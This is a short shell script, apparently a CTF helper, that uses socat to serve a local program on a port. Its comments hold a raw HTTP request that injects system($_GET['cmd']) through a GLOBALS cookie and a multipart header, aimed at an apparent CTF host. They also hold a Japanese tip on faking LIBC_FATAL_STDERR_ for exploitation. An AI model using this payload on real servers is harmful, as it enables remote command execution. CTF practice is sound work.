#!/bin/sh
#
# socat.sh
#
# Copyright (c) 2019 gpp256
# This software is distributed under the MIT License.
#
if [ $# -ne 2 ] ; then
	echo "Usage: ./$0 port command"; echo
	echo -n "  e.g.\n  sh socat.sh 5555 ./cmd\n\n"; exit 1
fi
socat TCP-LISTEN:$1,reuseaddr,fork EXEC:$2

# cat request.txt
#POST /?cmd=ls+-alF HTTP/1.0
#Host: wildwildweb.fluxfingers.net:1425
#Cookie: GLOBALS=assert
#Connection: keep-alive
#Content-Type: multipart/form-data; boundary=--mijnensbathias
#Content-Length: 148
#
#----mijnensbathias
#Content-Disposition: form-data; name="assert"; filename="empty"
#Content-Type: system($_GET['cmd']);
#
#
#----mijnensbathias--
## socat -d -ls openssl:wildwildweb.fluxfingers.net:1425,cafile=./ca-bundle.pem stdio < request.txt

#socatの動作をxinetdに似せたい場合はstderr,setsidオプションを付与する

#socat配下で動いており，かつstderr,setsidが無いと思われる場合は，環境変数LIBC_FATAL_STDERR_=1を偽造すれば良い

# socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./steak,stderr,setsid

# socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./smashme,pty,setsid,ctty

